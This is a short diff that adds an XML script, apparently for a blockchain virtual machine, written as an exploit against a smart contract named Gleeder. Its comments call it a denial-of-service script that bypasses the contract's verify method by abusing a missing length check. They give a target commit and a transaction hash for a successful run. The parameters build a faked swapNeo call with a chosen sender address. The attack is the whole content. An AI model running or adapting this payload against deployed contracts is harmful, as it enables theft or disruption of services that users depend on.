@@ -1,0 +1,15 @@
+<lazy xmlns:a="Assembly" xmlns:b="Basic">
+    <!-- Gleeder commit 817bebababf0de9484ee36a660f945065ca0c9c3 --> 
+    <!-- this is a DOS script that will bytpass gleeder's verify method -->
+    <!-- success tx: 0xcf3d99cbe5dd2f875e6e07cfdbb82a6fc1d45652aa36e2b35426a98685c0a672 -->
+    <a:int val="1" /> <!-- amountIn = 1 -->
+    <a:int val="1" /> <!-- amountOutMin = 1 -->
+    <a:bytes val="04b878c2d8d907ecf1d718990f903867c592a113" /> <!-- sender = our address in little endian, we should and this account's signature in tx -->
+    <a:int val="3" />
+    <pack /> <!-- pack these two parameters -->
+    <a:int val="15" />
+    <a:bytes val="737761704e656f0c145e2b02b2660e3c60084da6c17b36b93fa1af624941627d5b52" />
+    <!-- the contract didn't check this variabl's length -->
+    <!-- fake the call to swapNeo on gleeder -->
+</lazy>
+
